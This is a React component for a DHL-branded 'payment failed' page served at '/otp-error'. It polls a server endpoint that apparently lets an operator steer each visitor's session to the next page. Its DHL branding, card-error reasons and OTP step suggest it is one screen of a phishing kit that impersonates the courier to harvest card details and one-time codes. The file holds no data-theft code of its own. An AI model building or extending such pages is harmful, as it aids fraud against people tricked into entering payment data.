import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { XCircle, Home, RefreshCw } from "lucide-react";
import { useEffect, useState } from "react";
import { useRedirectPolling } from "@/hooks/use-redirect-polling";
import { useLanguage } from "@/hooks/use-language";

export default function DHLErrorPage() {
  const { t } = useLanguage();
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [paymentId, setPaymentId] = useState<string>("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("session");
    const pId = params.get("paymentId");
    if (id) setSessionId(id);
    if (pId) setPaymentId(pId);
  }, []);

  // Use redirect polling hook
  useRedirectPolling({
    sessionId,
    currentPath: "/otp-error",
    paymentId,
    apiEndpoint: "/api/dhl/session",
    pathEndpoint: "/api/dhl/session/:sessionId/path",
  });

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 to-orange-50 flex items-center justify-center p-4">
      <Card className="w-full max-w-md shadow-xl border-2 border-red-500">
        <CardHeader className="space-y-3 text-center bg-gradient-to-r from-red-500 to-red-600 text-white">
          <div className="flex justify-center">
            <div className="bg-white rounded-full p-4">
              <XCircle className="h-16 w-16 text-red-500" />
            </div>
          </div>
          <CardTitle className="text-2xl font-bold">
            {t('paymentFailed')}
          </CardTitle>
          <CardDescription className="text-white/90">
            {t('paymentError')}
          </CardDescription>
        </CardHeader>

        <CardContent className="pt-6 space-y-6">
          <div className="flex justify-center -mt-2 mb-2">
            <img src="/dhl-logo.png" alt="DHL" className="h-8 opacity-80" />
          </div>

          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <p className="text-sm text-red-800 font-medium mb-2">
              {t('possibleReasons')}
            </p>
            <ul className="text-sm text-red-700 space-y-1 list-disc list-inside">
              <li>{t('incorrectCardInfo')}</li>
              <li>{t('insufficientFunds')}</li>
              <li>{t('expiredCard')}</li>
              <li>{t('connectionProblem')}</li>
            </ul>
          </div>

          <div className="space-y-3">
            <Button
              className="w-full h-12 bg-gradient-to-r from-[#FFCC00] to-[#D40511] hover:opacity-90 text-white font-semibold"
              onClick={() => window.location.href = "/"}
              data-testid="button-retry"
            >
              <RefreshCw className="mr-2 h-5 w-5" />
              {t('retryPayment')}
            </Button>

            <Button
              variant="outline"
              className="w-full h-12"
              onClick={() => window.location.href = "/"}
              data-testid="button-home"
            >
              <Home className="mr-2 h-5 w-5" />
              {t('returnHome')}
            </Button>
          </div>

          <div className="text-center text-sm text-gray-600 border-t pt-4">
            <p className="mb-2">{t('needHelp')}</p>
            <p className="text-xs text-gray-500">
              {t('contactSupport')} <br />
              <span className="font-semibold">support@dhl.com</span>
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
